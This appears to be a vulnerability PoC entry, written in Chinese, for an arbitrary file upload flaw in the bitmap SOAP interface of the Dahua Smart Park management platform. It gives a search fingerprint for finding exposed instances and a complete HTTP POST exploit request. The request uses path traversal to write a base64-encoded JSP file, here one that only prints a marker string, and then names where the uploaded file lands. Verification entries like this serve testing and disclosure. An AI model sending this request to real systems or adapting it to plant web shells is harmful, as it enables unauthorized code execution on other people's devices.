﻿# 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞

> 更新时间：2024-02-06

> 漏洞编号：

> 漏洞说明：大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。平台意在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞，但未在上传的文件类型、大小、格式、路径等方面进行严格的限制和过滤，导致攻击者可以通过构造恶意文件并上传到设备上。

> 漏洞特征："/WPMS/asset/lib/gridster/"||app="dahua-智慧园区综合管理平台"

> 验证脚本：HTTP

```
POST /emap/webservice/gis/soap/bitmap HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml; charset=utf-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
    <soapenv:Header/>           
        <soapenv:Body>
                 <res:uploadPicFile>
                    <arg0>
                     <picPath>/../dudesite.jsp</picPath>
                    </arg0>
                    <arg1>PCUgb3V0LnByaW50bG4oImZsYWdmbGFnIik7ICU+</arg1>
                </res:uploadPicFile>
        </soapenv:Body>
</soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/upload/dudesite.jsp


> 验证文件来源：大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞.poc
